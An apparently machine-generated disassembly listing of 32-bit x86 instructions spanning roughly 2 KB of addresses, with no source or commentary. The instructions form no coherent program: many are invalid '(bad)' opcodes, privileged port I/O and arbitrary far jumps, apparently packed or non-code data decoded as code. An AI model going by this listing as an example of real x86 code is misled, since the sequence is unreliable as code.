  413a19:	outs   dx,DWORD PTR ds:[esi]
  413a1a:	sub    bh,al
  413a1c:	shl    DWORD PTR es:[eax-0x10ba4671],cl
  413a23:	xchg   edi,eax
  413a24:	ret    
  413a25:	test   al,bh
  413a27:	mov    ch,0x3e
  413a29:	jl     0x413a21
  413a2b:	sub    bh,dh
  413a2d:	xchg   ecx,eax
  413a2e:	cmp    BYTE PTR [eax-0x27],0x12
  413a32:	mov    ds,WORD PTR [esi]
  413a34:	sub    ch,ah
  413a36:	nop
  413a37:	and    BYTE PTR [esi-0x740b70f5],ah
  413a3d:	jge    0x413a0b
  413a3f:	enter  0x946e,0xe9
  413a43:	imul   eax,ecx,0x673c89a0
  413a49:	pop    edi
  413a4a:	ret    
  413a4b:	sbb    dl,0xdc
  413a4e:	fwait
  413a4f:	or     DWORD PTR [ebx],ebx
  413a51:	or     al,0x6b
  413a53:	cli    
  413a54:	push   edx
  413a55:	fcomp  DWORD PTR [edi]
  413a57:	inc    ah
  413a59:	ret    
  413a5a:	and    dh,BYTE PTR [ebx]
  413a5c:	dec    ebx
  413a5d:	push   ss
  413a5e:	jg     0x413aa8
  413a60:	pop    ss
  413a61:	faddp  st(6),st
  413a63:	pop    eax
  413a64:	dec    ebp
  413a65:	sbb    bh,0x8
  413a68:	lods   eax,DWORD PTR ds:[esi]
  413a69:	cdq    
  413a6a:	jp     0xbeeea0a0
  413a70:	outs   dx,BYTE PTR ds:[esi]
  413a71:	pusha  
  413a72:	cwde   
  413a73:	push   edi
  413a74:	push   eax
  413a75:	xchg   DWORD PTR [esi],esi
  413a77:	cdq    
  413a78:	mov    DWORD PTR [ebx+0x3fe6303],ebx
  413a7e:	and    DWORD PTR [eax],esi
  413a80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a81:	sbb    cl,BYTE PTR [esi-0x2ecc3c4a]
  413a87:	add    ecx,DWORD PTR [edi+0x4f]
  413a8a:	imul   eax,DWORD PTR [ebx+ecx*4],0xe45f703
  413a91:	push   edx
  413a92:	push   ds
  413a93:	mov    al,ds:0x542d518c
  413a98:	mov    ecx,0x8c131e59
  413a9d:	out    0x7d,al
  413a9f:	inc    edx
  413aa0:	sbb    dh,al
  413aa2:	shl    ah,1
  413aa4:	xchg   esp,eax
  413aa5:	out    0x94,eax
  413aa7:	shl    DWORD PTR [edi+0x2a],1
  413aaa:	mov    al,BYTE PTR [ecx-0x46]
  413aad:	call   0x6281b8a5
  413ab2:	pop    ds
  413ab3:	retf   
  413ab4:	and    cl,BYTE PTR [edi]
  413ab6:	and    DWORD PTR [eax+0x6a0e04b1],0x676161c8
  413ac0:	fwait
  413ac1:	mov    ds:0x7ad478d0,al
  413ac6:	cmp    eax,0x5114223b
  413acb:	mov    es,WORD PTR [esp+edx*2-0x69]
  413acf:	xchg   ebx,eax
  413ad0:	jg     0x413a6e
  413ad2:	inc    esp
  413ad3:	stos   DWORD PTR es:[edi],eax
  413ad4:	xchg   edx,eax
  413ad5:	cmp    esi,DWORD PTR [eax+ebp*8]
  413ad8:	mov    esi,0x52d4194f
  413add:	mov    ah,BYTE PTR [ecx+ebx*2-0x35]
  413ae1:	test   al,0x16
  413ae3:	push   ecx
  413ae4:	addr16 test edi,ecx
  413ae7:	pop    ecx
  413ae8:	fs inc esi
  413aea:	jbe    0x413b43
  413aec:	xchg   ebx,eax
  413aed:	mov    DWORD PTR ds:0x392e4d43,esi
  413af3:	cmp    al,0x3e
  413af5:	and    BYTE PTR [ebp-0x47e7a52f],cl
  413afb:	addr16 xor eax,esi
  413afe:	cwde   
  413aff:	or     edx,DWORD PTR ds:0xbdcfbefa
  413b05:	dec    esi
  413b06:	popf   
  413b07:	fadd   DWORD PTR [edx+0x31e00e6e]
  413b0d:	mov    esp,0x68fd8dcd
  413b12:	sub    al,0xcc
  413b14:	sub    al,0x6f
  413b16:	or     eax,0xec78e894
  413b1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b1c:	inc    esp
  413b1d:	pop    esp
  413b1e:	sbb    esi,DWORD PTR cs:[si-0x5]
  413b23:	lahf   
  413b24:	mov    ch,cl
  413b26:	das    
  413b27:	pop    ebp
  413b28:	in     al,0x92
  413b2a:	mov    BYTE PTR [esi-0x5],cl
  413b2d:	ins    BYTE PTR es:[edi],dx
  413b2e:	daa    
  413b2f:	dec    ebp
  413b30:	sahf   
  413b31:	mov    ds:0xeb5c6a8d,al
  413b36:	(bad)  
  413b37:	jno    0x413b70
  413b39:	mov    edi,0xecfcba98
  413b3e:	cdq    
  413b3f:	test   eax,0x361e4537
  413b44:	cli    
  413b45:	adc    al,0x62
  413b47:	pusha  
  413b48:	jmp    0xca91:0x321c3fe9
  413b4f:	mov    edi,0xa98f6734
  413b54:	std    
  413b55:	sub    eax,0x7f65ef86
  413b5a:	leave  
  413b5b:	scas   al,BYTE PTR es:[edi]
  413b5c:	mov    DWORD PTR [eax+0x2a],esi
  413b5f:	imul   edi,DWORD PTR [ecx],0xffffffbc
  413b62:	mov    DWORD PTR [edi+0x555ce188],esp
  413b68:	sar    BYTE PTR [edx],0xd0
  413b6b:	jge    0x413bba
  413b6d:	icebp  
  413b6e:	jle    0x413baa
  413b70:	cld    
  413b71:	xlat   BYTE PTR ds:[ebx]
  413b72:	and    dh,0x73
  413b75:	mov    bh,0x6b
  413b77:	xchg   ebx,eax
  413b78:	pop    ebx
  413b79:	ret    0x3976
  413b7c:	xchg   ebx,eax
  413b7d:	dec    ecx
  413b7e:	scas   eax,DWORD PTR es:[edi]
  413b7f:	pop    ds
  413b80:	ja     0x413b5e
  413b82:	push   edx
  413b83:	jns    0x413b34
  413b85:	mov    ss,eax
  413b87:	stc    
  413b88:	pop    ds
  413b89:	loopne 0x413bb5
  413b8b:	loope  0x413ba9
  413b8d:	out    0xd0,al
  413b8f:	pop    ebp
  413b90:	adc    al,0x5d
  413b92:	mov    ebp,0xc05a530e
  413b97:	or     ebp,ebx
  413b99:	xor    ch,dh
  413b9b:	fstp   DWORD PTR [edx+ecx*4+0x46e25f2c]
  413ba2:	inc    ebp
  413ba3:	mov    ?,ebx
  413ba5:	push   edx
  413ba6:	cmp    ebp,DWORD PTR [edi-0x115839a3]
  413bac:	ins    DWORD PTR es:[edi],dx
  413bad:	inc    eax
  413bae:	mov    al,ds:0x12d6f1e2
  413bb3:	sbb    DWORD PTR [edx-0x78],esi
  413bb6:	push   es
  413bb7:	mov    al,ds:0xc4b09f02
  413bbc:	cmp    DWORD PTR [edi+0x6e80355f],eax
  413bc2:	and    BYTE PTR [edi-0x64],0x7a
  413bc6:	lods   eax,DWORD PTR ds:[esi]
  413bc7:	lds    edx,FWORD PTR [edx+0x9]
  413bca:	or     ebx,edx
  413bcc:	xchg   edi,eax
  413bcd:	out    dx,al
  413bce:	sub    DWORD PTR [eax+0x6a86704b],eax
  413bd4:	call   0x17a6:0xef8e38bf
  413bdb:	call   0x3d9a:0xca70cbdf
  413be2:	bound  edi,QWORD PTR [ebp-0x5f]
  413be5:	add    DWORD PTR [edx],esp
  413be7:	je     0x413b70
  413be9:	and    BYTE PTR [ebx-0x5d594b1d],bh
  413bef:	xchg   ebx,eax
  413bf0:	jl     0x413b9c
  413bf2:	mov    dl,0xbd
  413bf4:	arpl   WORD PTR [eax+ebp*8],sp
  413bf7:	aaa    
  413bf8:	pop    ss
  413bf9:	and    ch,bl
  413bfb:	in     al,0xbc
  413bfd:	or     DWORD PTR [esi-0x2558535f],eax
  413c03:	lahf   
  413c04:	jl     0x413bb4
  413c06:	xor    ebp,esp
  413c08:	fstp   QWORD PTR [edi+0x9]
  413c0b:	and    DWORD PTR [ebx],ebx
  413c0d:	inc    esi
  413c0e:	mov    ch,0x75
  413c10:	leave  
  413c11:	sbb    al,0x50
  413c13:	cmp    eax,0x3578e01d
  413c18:	idiv   DWORD PTR [ecx]
  413c1a:	std    
  413c1b:	mov    WORD PTR [eax],ss
  413c1d:	inc    BYTE PTR [edx-0x2be588ba]
  413c23:	cmp    ecx,DWORD PTR [esi+0x6c1ae47]
  413c29:	xchg   DWORD PTR [esi+0x3d],ebp
  413c2c:	mov    al,0x89
  413c2e:	mov    esp,0xf204f536
  413c33:	jmp    0xd844:0x9dfe3e60
  413c3a:	jae    0x413caa
  413c3c:	mov    bl,0x3b
  413c3e:	int3   
  413c3f:	xchg   BYTE PTR [ecx-0x7f],dl
  413c42:	cmp    al,0x7f
  413c44:	pop    eax
  413c45:	cwde   
  413c46:	push   cs
  413c47:	pop    ss
  413c48:	mov    ah,al
  413c4a:	ins    DWORD PTR es:[edi],dx
  413c4b:	in     al,dx
  413c4c:	dec    ecx
  413c4d:	mov    dl,0x96
  413c4f:	cli    
  413c50:	gs in  eax,0xa0
  413c53:	inc    ecx
  413c54:	and    BYTE PTR [eax],dl
  413c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c57:	test   BYTE PTR [eax+0x47217b4f],0xf4
  413c5e:	sub    ebx,DWORD PTR ss:[edi]
  413c61:	xlat   BYTE PTR ds:[ebx]
  413c62:	mov    al,ds:0x109d62c
  413c67:	lahf   
  413c68:	sub    DWORD PTR [eax-0x1e281641],ebx
  413c6e:	mov    dh,0x9f
  413c70:	fdiv   st(3),st
  413c72:	dec    eax
  413c73:	xor    ch,bh
  413c75:	sbb    eax,esi
  413c77:	cmp    eax,0x570732aa
  413c7c:	pop    eax
  413c7d:	bound  esp,QWORD PTR [edi+0x4ceaea9]
  413c83:	cmc    
  413c84:	add    DWORD PTR [ebp-0x58],eax
  413c87:	stos   BYTE PTR es:[edi],al
  413c88:	loop   0x413c54
  413c8a:	xlat   BYTE PTR ds:[ebx]
  413c8b:	jge    0x413c27
  413c8d:	adc    ah,BYTE PTR fs:[esp+esi*1+0x1a]
  413c92:	mov    edi,?
  413c94:	cmc    
  413c95:	adc    eax,0xd66461d9
  413c9a:	push   ds
  413c9b:	imul   esi,DWORD PTR [edx-0x69],0x72895450
  413ca2:	(bad)  
  413ca3:	sbb    BYTE PTR [ecx],al
  413ca5:	add    ebp,DWORD PTR [esi]
  413ca7:	sbb    eax,0x7deab7d
  413cac:	ret    0xb1d0
  413caf:	jno    0x413c78
  413cb1:	icebp  
  413cb2:	lea    ebp,ds:0xfae8c195
  413cb8:	mov    bh,0x8f
  413cba:	ds inc ebp
  413cbc:	mov    dh,0x87
  413cbe:	sub    eax,0xe8e4042
  413cc3:	cmp    BYTE PTR [ecx-0x5dd79ca6],0x7f
  413cca:	pop    ebx
  413ccb:	or     DWORD PTR ds:0xa0310d5c,ecx
  413cd1:	mov    cl,0xf4
  413cd3:	jae    0x413cb0
  413cd5:	add    DWORD PTR [eax],ebx
  413cd7:	imul   edx,DWORD PTR [ebp+0x2],0x2600a27f
  413cde:	ret    0x5cac
  413ce1:	xchg   si,di
  413ce4:	and    DWORD PTR ds:0xb265f3a8,ebp
  413cea:	cmc    
  413ceb:	mov    ch,0x13
  413ced:	adc    esp,ebp
  413cef:	pop    esi
  413cf0:	loop   0x413c8b
  413cf2:	hlt    
  413cf3:	(bad)  
  413cf5:	jmp    0x303b:0xacc20c4
  413cfc:	cwde   
  413cfd:	sbb    DWORD PTR [esi-0x7c],ebx
  413d00:	(bad)  
  413d01:	cmp    ebx,DWORD PTR [esi-0x1a470598]
  413d07:	pop    ecx
  413d08:	repnz fistp DWORD PTR [ecx-0x46088a6]
  413d0f:	popa   
  413d10:	mov    ah,0x5
  413d12:	repz sbb cl,BYTE PTR [eax+0x5e7a2ded]
  413d19:	rcl    BYTE PTR ds:0x970d4706,1
  413d1f:	add    eax,0xb37b03c2
  413d24:	adc    cl,BYTE PTR [edi]
  413d26:	addr16 ja 0x413cf6
  413d29:	dec    edx
  413d2a:	jae    0x413d03
  413d2c:	jno    0x413d3c
  413d2e:	mov    eax,0x23a7b8fe
  413d33:	iret   
  413d34:	mov    eax,ds:0x1b3f70ce
  413d39:	loop   0x413dae
  413d3b:	pop    ecx
  413d3c:	les    esi,FWORD PTR [esi]
  413d3e:	test   edi,eax
  413d40:	rol    bl,0xef
  413d43:	mov    ds,WORD PTR [eax]
  413d45:	jmp    0x413cf7
  413d47:	xchg   DWORD PTR [eax+0x2b],ecx
  413d4a:	aad    0x56
  413d4c:	test   BYTE PTR [ecx],ah
  413d4e:	movsx  edx,ah
  413d51:	imul   esi,eax,0xffffffea
  413d54:	retf   
  413d55:	push   ecx
  413d56:	(bad)  
  413d57:	xor    DWORD PTR [ecx-0x5c4d07fc],esp
  413d5d:	sbb    dl,BYTE PTR [edx+0x49ef6a87]
  413d63:	sub    eax,0xea25ccc8
  413d68:	mov    ebx,0xfc8cb992
  413d6d:	dec    edx
  413d6e:	sbb    eax,0xd1177903
  413d73:	adc    ch,al
  413d75:	cs mov dh,0xcd
  413d78:	adc    DWORD PTR [edx+0x6792c161],0x95ff41c6
  413d82:	adc    BYTE PTR [ecx],al
  413d84:	sbb    DWORD PTR [ebp-0x54c705b3],ebp
  413d8a:	add    DWORD PTR [ebp+0x6656a7ce],esi
  413d90:	or     BYTE PTR [edi-0x44c83c39],ah
  413d96:	push   esi
  413d97:	dec    edx
  413d98:	loopne 0x413d56
  413d9a:	icebp  
  413d9b:	fsubr  QWORD PTR [edi+eiz*8+0x2d]
  413d9f:	cmp    al,0x73
  413da1:	inc    edx
  413da2:	std    
  413da3:	jne    0x413d4a
  413da5:	cwde   
  413da6:	dec    ebx
  413da7:	pusha  
  413da8:	mov    ah,0x5b
  413daa:	lock ds ss or eax,0x94170606
  413db2:	mov    ch,0x38
  413db4:	or     eax,DWORD PTR [eax+0x3c]
  413db7:	jns    0x413dd7
  413db9:	sti    
  413dba:	jmp    0x413dab
  413dbc:	lds    eax,FWORD PTR [ebp+0x3010604d]
  413dc2:	cmp    al,0x8
  413dc4:	je     0x413da4
  413dc6:	push   0xffffff90
  413dc8:	mov    ebx,DWORD PTR [edx-0x46]
  413dcb:	fnsave gs:[ebx+0x7f]
  413dcf:	fcmovbe st,st(1)
  413dd1:	mov    BYTE PTR [eax-0x6d3a6d4a],cl
  413dd7:	aad    0x49
  413dd9:	sbb    esi,DWORD PTR [ebp-0x45]
  413ddc:	dec    esp
  413ddd:	sub    ebp,ebp
  413ddf:	clc    
  413de0:	push   cs
  413de1:	fisttp QWORD PTR [ecx]
  413de3:	pop    eax
  413de4:	out    dx,eax
  413de5:	mov    ah,0x8b
  413de7:	xlat   BYTE PTR ds:[ebx]
  413de8:	repnz adc DWORD PTR [eax-0x69],eax
  413dec:	push   ebp
  413ded:	fs jle 0x413e34
  413df0:	stc    
  413df1:	stos   DWORD PTR es:[edi],eax
  413df2:	test   eax,0x9ac3e2a0
  413df7:	fild   QWORD PTR [esi-0x717739ba]
  413dfd:	(bad)  
  413dfe:	cli    
  413dff:	test   DWORD PTR [edx+0x5048d55e],ebp
  413e05:	out    0xcf,al
  413e07:	in     al,dx
  413e08:	jo     0x413db7
  413e0a:	dec    eax
  413e0b:	aaa    
  413e0c:	stos   BYTE PTR es:[edi],al
  413e0d:	add    BYTE PTR [eax+eax*8+0x373a3704],cl
  413e14:	push   ebp
  413e15:	xchg   ecx,eax
  413e16:	inc    esp
  413e17:	aam    0x4d
  413e19:	or     edi,DWORD PTR [ecx+esi*1-0x4c5794ee]
  413e20:	push   esp
  413e21:	test   dh,0x5f
  413e24:	iret   
  413e25:	orps   xmm3,XMMWORD PTR [edi]
  413e28:	jp     0x413e22
  413e2a:	xchg   DWORD PTR [ecx+0x21],esp
  413e2d:	fisttp DWORD PTR [ebx]
  413e2f:	fimul  DWORD PTR [ebp+0x25]
  413e32:	ds cwde 
  413e34:	mov    bl,0xab
  413e36:	nop
  413e37:	popa   
  413e38:	es cdq 
  413e3a:	sbb    al,0xe2
  413e3c:	mov    ebx,0x3a11672b
  413e41:	fistp  DWORD PTR [edi]
  413e43:	jns    0x413e0e
  413e45:	inc    eax
  413e46:	in     al,dx
  413e47:	les    edi,FWORD PTR [eax]
  413e49:	cs aam 0xc8
  413e4c:	inc    ebx
  413e4d:	out    0x96,eax
  413e4f:	jae    0x413e9c
  413e51:	push   esp
  413e52:	pop    es
  413e53:	push   ebp
  413e54:	fbstp  TBYTE PTR [esi]
  413e56:	fdiv   DWORD PTR [ebx]
  413e58:	test   al,0x53
  413e5a:	xor    BYTE PTR [eax-0x27cccc5e],bh
  413e60:	inc    eax
  413e61:	test   al,0x1
  413e63:	pop    ds
  413e64:	shr    bx,cl
  413e67:	dec    edx
  413e68:	les    edi,FWORD PTR [eax]
  413e6a:	mov    ebx,0x456d1450
  413e6f:	cmp    ecx,edi
  413e71:	adc    cl,cl
  413e73:	mov    bh,0xbb
  413e75:	(bad)  
  413e76:	retf   0x8eda
  413e79:	xor    eax,DWORD PTR [edx+eax*2]
  413e7c:	(bad)  
  413e7d:	jo     0x413eeb
  413e7f:	aam    0x2d
  413e81:	xor    DWORD PTR [ebx-0x54],edi
  413e84:	popa   
  413e85:	mov    eax,0x9f548733
  413e8a:	sub    BYTE PTR ss:[eax+edi*8],ah
  413e8e:	sub    eax,0x1fa509c9
  413e93:	clc    
  413e94:	imul   ebx,DWORD PTR [edx-0x7e],0xe8bede86
  413e9b:	std    
  413e9c:	int3   
  413e9d:	push   ss
  413e9e:	stos   BYTE PTR es:[edi],al
  413e9f:	out    dx,al
  413ea0:	fmul   DWORD PTR [esi]
  413ea2:	je     0x413f0c
  413ea4:	call   0x61c6:0xa320f5aa
  413eab:	out    0x53,al
  413ead:	into   
  413eae:	icebp  
  413eaf:	scas   eax,DWORD PTR es:[edi]
  413eb0:	push   cs
  413eb1:	xchg   DWORD PTR [ebx-0x45],esi
  413eb4:	adc    dl,al
  413eb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413eb7:	cmp    DWORD PTR [ebx+esi*1-0x2b],ecx
  413ebb:	add    al,0x18
  413ebd:	in     al,dx
  413ebe:	and    ch,cl
  413ec0:	xor    bh,cl
  413ec2:	loopne 0x413eaf
  413ec4:	pushf  
  413ec5:	jmp    0x3167:0xbf3ce21b
  413ecc:	test   dl,ah
  413ece:	cwde   
  413ecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ed0:	(bad)  
  413ed1:	sti    
  413ed2:	jb     0x413ec5
  413ed4:	pop    edx
  413ed5:	aad    0xff
  413ed7:	in     eax,dx
  413ed8:	adc    ecx,esp
  413eda:	fidivr WORD PTR [edx-0xe5d2fb5]
  413ee0:	(bad)  
  413ee1:	ds ja  0x413eef
  413ee4:	mov    ch,0x61
  413ee6:	stos   BYTE PTR es:[edi],al
  413ee7:	mov    dh,BYTE PTR [ecx+0x35]
  413eea:	aaa    
  413eeb:	pushf  
  413eec:	jecxz  0x413eba
  413eee:	mov    ds:0x9020d0c8,al
  413ef3:	cmp    DWORD PTR [ebx],edi
  413ef5:	jb     0x413f2a
  413ef7:	push   ecx
  413ef8:	xchg   esp,eax
  413ef9:	xor    eax,0x19c7a0b5
  413efe:	or     eax,0x1c1f8576
  413f03:	xlat   BYTE PTR ds:[ebx]
  413f04:	jno    0x413ed5
  413f06:	dec    edx
  413f07:	rol    BYTE PTR [ebp-0x64],cl
  413f0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f0b:	sbb    cl,BYTE PTR [edx-0x70f0dfd5]
  413f11:	push   esp
  413f12:	cld    
  413f13:	retf   
  413f14:	imul   edx,DWORD PTR [esi+0xc],0xfcc5206a
  413f1b:	cmp    DWORD PTR [ebx],edx
  413f1d:	jecxz  0x413ed2
  413f1f:	sub    DWORD PTR [eax+0x519804a],esi
  413f25:	test   BYTE PTR [edx],0x79
  413f28:	data16 into 
  413f2a:	aaa    
  413f2b:	pushf  
  413f2c:	add    DWORD PTR [ecx],eax
  413f2e:	and    BYTE PTR [ecx],dl
  413f30:	(bad)  
  413f31:	test   ch,0xe0
  413f34:	retf   
  413f35:	inc    ebx
  413f36:	jl     0x413f82
  413f38:	imul   ebx,ebx,0xfffffff6
  413f3b:	xchg   BYTE PTR [eax+0x1e],cl
  413f3e:	and    BYTE PTR [edx],dl
  413f40:	mov    WORD PTR [ebp+0x461ae798],?
  413f46:	add    BYTE PTR [eax+0x78],bh
  413f49:	sbb    BYTE PTR [esi-0x4f],dh
  413f4c:	push   cs
  413f4d:	jno    0x413fa7
  413f4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f50:	xchg   ebp,eax
  413f51:	dec    edi
  413f52:	xchg   ebx,eax
  413f53:	f2xm1  
  413f55:	cmc    
  413f56:	cld    
  413f57:	and    eax,0xcbcb8e04
  413f5c:	mov    ah,0xee
  413f5e:	dec    edi
  413f5f:	rcl    BYTE PTR [eax-0x1d],cl
  413f62:	or     BYTE PTR [ebx+edi*4+0x6d45c13c],ch
  413f69:	jae    0x413f9d
  413f6b:	add    al,0xe2
  413f6d:	pusha  
  413f6e:	ret    
  413f6f:	aaa    
  413f70:	jbe    0x413f88
  413f72:	pop    ecx
  413f73:	out    0x45,al
  413f75:	je     0x413f04
  413f77:	inc    esi
  413f78:	ret    0x34d8
  413f7b:	xchg   ebp,eax
  413f7c:	dec    ebx
  413f7d:	(bad)  
  413f7e:	push   edx
  413f7f:	xchg   DWORD PTR [ecx+0x9],ecx
  413f82:	and    eax,0xee60a8d7
  413f87:	or     al,BYTE PTR [edx-0x5d]
  413f8a:	inc    ebp
  413f8b:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  413f8d:	js     0x413fbc
  413f8f:	sub    BYTE PTR [esp+eax*4-0x65761615],bh
  413f96:	jmp    0x413fa0
  413f98:	ins    DWORD PTR es:[edi],dx
  413f99:	push   ecx
  413f9a:	iret   
  413f9b:	adc    al,0xb6
  413f9d:	pop    ds
  413f9e:	in     eax,dx
  413f9f:	or     DWORD PTR [eax+0x98352d8],esi
  413fa5:	pop    edx
  413fa6:	mov    cl,0xbc
  413fa8:	and    eax,0x9fd7073
  413fad:	inc    ebx
  413fae:	mov    edx,edi
  413fb0:	mov    esp,DWORD PTR [ebx+0x7b]
  413fb3:	xchg   DWORD PTR [ebx],edi
  413fb5:	sub    esp,DWORD PTR [ebx-0x31]
  413fb8:	sub    eax,DWORD PTR [esi+0x18]
  413fbb:	xor    dl,BYTE PTR [ebx-0x368ba8b4]
  413fc1:	and    ah,BYTE PTR [esi]
  413fc3:	mov    ds:0xce52fe43,eax
  413fc8:	or     DWORD PTR [ebx+0x21],edi
  413fcb:	fstp   QWORD PTR [ecx]
  413fcd:	pop    es
  413fce:	fldlg2 
  413fd0:	push   ss
  413fd1:	mov    edi,0x8cb51fc9
  413fd6:	fdiv   QWORD PTR [esi]
  413fd8:	scas   eax,DWORD PTR es:[edi]
  413fd9:	(bad)
  413fdd:	pop    ecx
  413fde:	div    DWORD PTR [edx+0x115b593d]
  413fe4:	inc    eax
  413fe5:	enter  0xafa2,0x10
  413fe9:	mov    esi,0x134ba75a
  413fee:	test   DWORD PTR [esi],edi
  413ff0:	mov    ecx,0xf86554b4
  413ff5:	sbb    ecx,DWORD PTR [eax+0x24]
  413ff8:	(bad)  
  413ff9:	jb     0x414053
  413ffb:	imul   esp,DWORD PTR [eax+0x38ea0e9a],0xb7742239
  414005:	pop    esi
  414006:	shl    BYTE PTR [ebp-0x19e863e1],cl
  41400c:	jns    0x413faf
  41400e:	pop    es
  41400f:	je     0x414079
  414011:	out    0xa0,eax
  414013:	icebp  
  414014:	clc    
  414015:	pop    esp
  414017:	jp     0x413fb6
  414019:	mov    dl,0x3d
  41401b:	fwait
  41401c:	imul   esp,DWORD PTR [ebp-0x60a40354],0x5fd3848e
  414026:	imul   ebp,DWORD PTR [ebx+0x5369a594],0xef28e7cf
  414030:	js     0x413fc1
  414032:	loop   0x413ff9
  414034:	jmp    FWORD PTR [edi-0x3e]
  414037:	in     eax,0x4f
  414039:	xor    eax,0xf8aa9606
  41403e:	sub    edx,DWORD PTR ds:0xcefb7bd5
  414044:	in     eax,dx
  414045:	and    DWORD PTR [ecx],ecx
  414047:	mul    BYTE PTR [edx+0x1eec157c]
  41404d:	sbb    eax,DWORD PTR [eax]
  41404f:	jg     0x41401a
  414051:	out    0x82,al
  414053:	inc    esp
  414054:	ja     0x41408d
  414056:	retf   0x613f
  414059:	call   0x23691beb
  41405e:	pop    ebp
  41405f:	addr16 adc eax,0x1d10c6ee
  414065:	call   0x6a48656b
  41406a:	push   ebx
  41406b:	jmp    0x41406c
  41406d:	cmc    
  41406e:	(bad)  
  41406f:	sub    eax,0x16a99c28
  414074:	and    eax,0x114da7c3
  414079:	cmp    eax,0xf10cde2d
  41407e:	pop    ebx
  41407f:	sbb    edi,edi
  414081:	test   BYTE PTR [ebx-0x60f1e2fe],0x3e
  414088:	push   eax
  414089:	lahf   
  41408a:	xlat   BYTE PTR ds:[ebx]
  41408b:	out    dx,eax
  41408c:	addr16 xchg ebx,eax
  41408e:	int3   
  41408f:	loop   0x414095
  414091:	retf   0xadeb
  414094:	sbb    al,0x16
  414096:	call   0xaab781ef
  41409b:	push   ss
  41409c:	imul   ebx,DWORD PTR [edx],0x41
  41409f:	jle    0x4140ae
  4140a1:	mov    cl,0xf4
  4140a3:	test   BYTE PTR [ebx-0x48],dh
  4140a6:	push   ebp
  4140a7:	adc    BYTE PTR [ebp-0x5b],cl
  4140aa:	xor    bh,BYTE PTR [ecx]
  4140ac:	test   al,0x4d
  4140ae:	push   esi
  4140af:	add    esp,DWORD PTR [esp+ebp*4-0x3f]
  4140b3:	and    ah,0xeb
  4140b6:	(bad)  
  4140b8:	(bad)  
  4140b9:	adc    esp,esp
  4140bb:	ins    BYTE PTR es:[edi],dx
  4140bc:	(bad)  
  4140bd:	mov    ds:0x1e0928c4,al
  4140c2:	mov    cl,0xac
  4140c4:	add    DWORD PTR [edx+0x666b4ded],ecx
  4140ca:	and    al,0x9e
  4140cc:	iret   
  4140cd:	push   edx
  4140ce:	(bad)  
  4140cf:	into   
  4140d0:	pop    ebp
  4140d1:	cmp    eax,0x743ba73e
  4140d6:	sub    edi,ecx
  4140d8:	lods   al,BYTE PTR ds:[esi]
  4140d9:	repnz adc al,0x66
  4140dc:	sar    DWORD PTR [edx-0x54],cl
  4140df:	add    DWORD PTR [ebx+0x3a],edi
  4140e2:	scas   al,BYTE PTR es:[edi]
  4140e3:	nop
  4140e4:	dec    ebx
  4140e5:	jnp    0x41409d
  4140e7:	mov    esi,0x85c7f12e
  4140ec:	test   bl,0xf5
  4140ef:	call   0xe25b:0x906f93af
  4140f6:	out    dx,eax
  4140f7:	dec    esp
  4140f8:	pop    esp
  4140f9:	fdivr  st,st(1)
  4140fb:	cs arpl di,si
  4140fe:	in     al,dx
  4140ff:	int3   
  414100:	hlt    
  414101:	neg    BYTE PTR [ebx+0x4f]
  414104:	adc    DWORD PTR [edi],eax
  414106:	les    ecx,FWORD PTR [ecx]
  414108:	shr    bl,0x50
  41410b:	mov    eax,ds:0x79f80295
  414110:	fmul   DWORD PTR [esi+0x342ede64]
  414116:	cmc    
  414117:	jbe    0x4140ed
  414119:	repz sbb bl,BYTE PTR [ebx]
  41411c:	add    DWORD PTR [eax-0x9],esp
  41411f:	fs xchg esp,eax
  414121:	cmp    eax,0x789f4365
  414126:	adc    BYTE PTR [ecx-0x25],bh
  414129:	xor    ch,bl
  41412b:	inc    edx
  41412c:	sub    BYTE PTR [edx],0x8e
  41412f:	outs   dx,BYTE PTR ds:[esi]
  414130:	mov    cl,0xb4
  414132:	adc    edx,DWORD PTR [edi-0x20d67e8c]
  414138:	fild   QWORD PTR [ecx+0x23]
  41413b:	adc    al,BYTE PTR [ecx]
  41413d:	jmp    0x9a631fff
  414142:	cs jb  0x41415e
  414145:	iret   
  414146:	dec    ebx
  414147:	inc    ebp
  414148:	scas   al,BYTE PTR es:[edi]
  414149:	jl     0x4140f4
  41414b:	cmp    al,0x6b
  41414d:	arpl   WORD PTR [edx+0xf],bx
  414150:	ja     0x41414e
  414152:	addr16 loop 0x4141a5
  414155:	mov    dh,0x55
  414157:	sub    esp,0xb96df265
  41415d:	sbb    edi,DWORD PTR [ebp+0x52a2645c]
  414163:	sbb    eax,0x291ca968
  414168:	test   al,0xbc
  41416b:	xor    DWORD PTR [ebx-0x43],0xe6a6623e
  414172:	clc    
  414173:	sbb    eax,0x14fad9d8
  414178:	jp     0x4141da
  41417a:	lods   al,BYTE PTR ds:[esi]
  41417b:	in     al,dx
  41417c:	lahf   
  41417d:	sub    esi,edi
  41417f:	int3   
  414180:	pusha  
  414181:	mov    ebx,0xaa8b4306
  414186:	adc    al,0xd0
  414188:	jmp    0xb974e3de
  41418d:	in     eax,dx
  41418e:	and    al,BYTE PTR [edi+0x4cf3f8ec]
  414194:	call   0x5bb2a5d0
  414199:	int    0x4e
  41419b:	lock out dx,al
  41419d:	push   cs
  41419e:	rcl    DWORD PTR [esp+edi*4+0x4],1
  4141a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141a3:	dec    esi
  4141a4:	ret    
  4141a5:	(bad)
  4141a8:	dec    ebp
  4141a9:	mov    edi,edx
  4141ab:	pop    ss
  4141ac:	sub    al,0x4d
  4141ae:	call   0x6825ca9e
  4141b3:	scas   eax,DWORD PTR es:[edi]
  4141b4:	sbb    ch,BYTE PTR [eax+ecx*4+0x47aee1b5]
  4141bb:	icebp  
  4141bc:	dec    esp
  4141bd:	mov    ch,0x44
  4141bf:	fcmovnu st,st(1)
  4141c1:	push   eax
  4141c2:	out    0x57,al
  4141c4:	scas   eax,DWORD PTR es:[edi]
  4141c5:	pop    ds
  4141c6:	stos   DWORD PTR es:[edi],eax
  4141c7:	ficomp WORD PTR [esi+esi*1-0x7f9c1065]
  4141ce:	mov    eax,ds:0x61425350
  4141d3:	cwde   
